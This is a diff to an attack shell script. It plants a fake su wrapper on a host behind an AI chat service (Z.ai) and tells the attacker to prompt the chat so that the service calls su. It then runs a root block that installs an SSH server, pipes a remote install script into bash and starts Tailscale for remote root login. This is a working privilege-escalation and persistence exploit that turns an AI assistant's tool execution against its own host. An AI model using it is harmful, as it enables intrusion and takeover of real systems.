@@ -21,6 +21,11 @@ exec /usr/bin/su "\$@"
 SUFILE
 chmod +x /usr/local/bin/su
 
+echo ''
+echo '[!] Now go to the Z.ai chat and type something, e.g.:'
+echo '    "What time is it on the host?"'
+echo '    This will trigger the API to call su internally.'
+echo ''
 echo '[*] Step 2: Waiting for API to call su (checking /tmp/pwn.log)...'
 for i in {1..120}; do
     if [ -f /tmp/pwn.log ]; then
@@ -35,14 +40,17 @@ if [ ! -f /tmp/pwn.log ]; then
     exit 1
 fi
 
-echo '[*] Step 3: Install SSH server'
+echo '[*] Step 3: Running post-exploit as root...'
+echo '12341234' | /usr/bin/su -c bash <<'ROOTSCRIPT'
+
+echo '[*] Step 3a: Install SSH server'
 apt-get update -qq 2>/dev/null
 apt-get install -y -qq openssh-server 2>/dev/null
 mkdir -p /run/sshd
-/usr/sbin/sshd
+$(which sshd) 2>/dev/null || /usr/sbin/sshd 2>/dev/null
 
 echo '[*] Step 4: Install Tailscale'
-curl -fsSL https://tailscale.com/install.sh | sh 2>/dev/null
+curl -fsSL https://tailscale.com/install.sh | bash 2>/dev/null
 
 echo '[*] Step 5: Start Tailscale (userspace mode)'
 pkill tailscaled 2>/dev/null
@@ -62,3 +70,5 @@ echo '[*] Connect via Tailscale:'
 echo "    URL: $LOGIN_URL"
 echo '    After auth: ssh root@<tailscale-ip>'
 echo '========================================'
+
+ROOTSCRIPT
